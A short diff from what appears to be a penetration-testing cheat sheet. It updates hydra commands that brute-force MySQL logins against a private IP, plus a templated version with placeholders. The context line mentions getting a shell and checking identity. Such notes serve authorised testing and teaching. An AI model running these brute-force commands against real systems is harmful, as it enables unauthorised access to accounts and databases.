@@ -89,4 +89,5 @@ execute:
 Ok now we can just execute the shell and chek identity with id.
 
 # Bruteforce (hydra)
-hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -V -f
+hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -vV -f -o report-hydra-mysql.txt
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u -o report-hydra-mysql.txt
